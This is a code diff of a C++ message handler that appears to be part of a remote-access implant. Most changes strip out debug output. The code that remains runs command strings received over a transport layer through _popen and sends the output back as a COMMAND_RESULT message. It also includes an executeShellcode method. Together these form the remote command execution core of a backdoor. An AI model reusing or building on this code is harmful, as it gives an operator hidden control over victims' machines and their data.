@@ -18,12 +18,12 @@
 MessageHandler::MessageHandler()
 	: transportLayer_(nullptr)
 {
-	std::cout << "inside messagehandler default constructor" << std::endl;
+	// debug statement
 }
 
 MessageHandler::~MessageHandler()
 {
-	std::cout << "messagehandler deconstructor" << std::endl;
+	// debug statement
 }
 
 bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
@@ -42,17 +42,10 @@ bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 		std::cout << "ERROR: transportLayer_ is NULL!" << std::endl;
 		return false;
 	}
-	// Check if we can access the transport layer
-	std::cout << "TransportLayer connected: " << transportLayer_->isConnected() << std::endl;
-	// Test: Call a simple method on transportLayer_
-	std::cout << "Testing transportLayer_ access..." << std::endl;
-	bool test = transportLayer_->isConnected();  // Simple method call
-	std::cout << "Test call successful: " << test << std::endl;
+
 
 	std::string command = byte2string(data).c_str();
 	std::string result;
-	
-
 
 	// EASIEST METHOD - just use _popen directly
 	FILE* pipe = _popen(command.c_str(), "r");
@@ -73,9 +66,6 @@ bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 	//queueResponse(COMMAND_RESULT, result, msg_id); // TODO: need to pass all of InternalMessage if i want ID
 	std::cout << result << std::endl;
 
-	std::cout << "Command result size: " << result.size() << std::endl;
-	std::cout << "Command result: " << result << std::endl;
-
 	// TODO: props should make a separate function for InternalMessage generation
 	InternalMessage outMsg;
 	outMsg.data = string2byte(result);
@@ -86,19 +76,12 @@ bool MessageHandler::executeCommand(std::vector<uint8_t>& data)
 	header.messageType = MessageType::COMMAND_RESULT;
 	header.messageId = 105; // TODO: 
 	header.dataSize = outMsg.data.size();
-	std::cout << "Header - type: " << static_cast<int>(header.messageType)
-		<< ", id: " << header.messageId
-		<< ", dataSize: " << header.dataSize << std::endl;
 	outMsg.header = header;
-	std::cout << "About to call sendMessage..." << std::endl;
-	bool sendResult = transportLayer_->sendMessage(outMsg);
-	std::cout << "sendMessage result: " << sendResult << std::endl;
 
-	std::cout << "=== EXECUTE COMMAND END ===" << std::endl;
+	bool sendResult = transportLayer_->sendMessage(outMsg);
 	return sendResult;
 }
 
-//bool MessageHandler::executeShellcode(std::vector<uint8_t>& data)
 bool MessageHandler::executeShellcode(InternalMessage& msg)
 {
 	std::cout << "executeShellcode" << std::endl;
@@ -212,12 +195,6 @@ void MessageHandler::setTransportLayer(TransportLayer& transportLayer)
 {
 	transportLayer_ = &transportLayer;
 }
-
-/*
-void MessageHandler::setTransporter(Transporter& transporter)
-{
-	transporter_ = &transporter;
-}*/
 
 std::vector<uint8_t> MessageHandler::string2byte(std::string& inMsg)
 {
